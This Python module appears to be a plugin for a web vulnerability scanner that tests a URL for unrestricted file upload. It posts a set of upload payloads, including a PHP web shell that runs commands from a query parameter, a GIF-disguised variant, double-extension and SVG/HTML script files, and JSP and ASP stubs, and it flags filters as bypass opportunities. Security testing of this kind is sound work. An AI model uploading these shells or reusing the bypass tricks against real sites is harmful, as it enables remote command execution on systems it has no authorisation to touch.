import requests
import random
import string
from . import get_session

def check(url, session=None):
    req_session = get_session(session)
    findings = []
    
    # Generate a unique identifier for this test
    test_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    
    # Test various dangerous file types and bypass techniques
    file_payloads = [
        # Basic PHP shell
        {
            "filename": f"shell_{test_id}.php",
            "content": "<?php echo 'FILE_UPLOAD_TEST'; system($_GET['cmd']); ?>",
            "content_type": "application/x-php"
        },
        # PHP with random extension
        {
            "filename": f"shell_{test_id}.jpg.php",
            "content": "<?php echo 'FILE_UPLOAD_TEST'; phpinfo(); ?>",
            "content_type": "image/jpeg"
        },
        # PHP with GIF magic bytes
        {
            "filename": f"shell_{test_id}.gif",
            "content": "GIF89a\r\n<?php echo 'FILE_UPLOAD_TEST'; system($_GET['cmd']); ?>",
            "content_type": "image/gif"
        },
        # SVG with embedded JavaScript
        {
            "filename": f"test_{test_id}.svg",
            "content": """<?xml version="1.0" standalone="no"?>
                        <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
                        <svg width="100" height="100" version="1.1" xmlns="http://www.w3.org/2000/svg">
                            <script>alert('FILE_UPLOAD_TEST');</script>
                        </svg>""",
            "content_type": "image/svg+xml"
        },
        # HTML file disguised as image
        {
            "filename": f"test_{test_id}.html",
            "content": "<script>alert('FILE_UPLOAD_TEST');</script>",
            "content_type": "text/html"
        },
        # JSP shell
        {
            "filename": f"shell_{test_id}.jsp",
            "content": """<%@ page import="java.util.*,java.io.*" %>
                        <% 
                        out.println("FILE_UPLOAD_TEST");
                        %>""",
            "content_type": "application/x-jsp"
        },
        # ASP shell
        {
            "filename": f"shell_{test_id}.asp",
            "content": """<%
                        Response.Write("FILE_UPLOAD_TEST")
                        %>""",
            "content_type": "application/x-asp"
        }
    ]
    
    # Test each payload
    for payload in file_payloads:
        # Prepare the file for upload
        files = {
            "file": (payload["filename"], payload["content"], payload["content_type"]),
            "upload": (payload["filename"], payload["content"], payload["content_type"]),
            "document": (payload["filename"], payload["content"], payload["content_type"]),
            "image": (payload["filename"], payload["content"], payload["content_type"]),
            "avatar": (payload["filename"], payload["content"], payload["content_type"])
        }
        
        # Common headers for file uploads
        header = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "X-Requested-With": "XMLHttpRequest"
        }
        
        for field_name, file_data in files.items():
            try:
                # Try POST request with this file field
                r = req_session.post(url, files={field_name: file_data}, headers=header, timeout=5)
                
                # Check for signs of successful upload
                response_indicators = [
                    "upload successful", "file uploaded", "success", "uploaded",
                    payload["filename"], "FILE_UPLOAD_TEST"
                ]
                
                if any(indicator.lower() in r.text.lower() for indicator in response_indicators):
                    findings.append(f"Potential file upload vulnerability: {payload['filename']} accepted via {field_name} field")
                    
                # Check for useful error messages
                error_indicators = [
                    "file type not allowed", "invalid file type", "extension not allowed",
                    "mime type not allowed", "file validation failed"
                ]
                
                if any(indicator.lower() in r.text.lower() for indicator in error_indicators):
                    findings.append(f"File upload filter detected: {payload['filename']} rejected - look for bypass opportunities")
                    
            except Exception:
                continue
    
    return findings
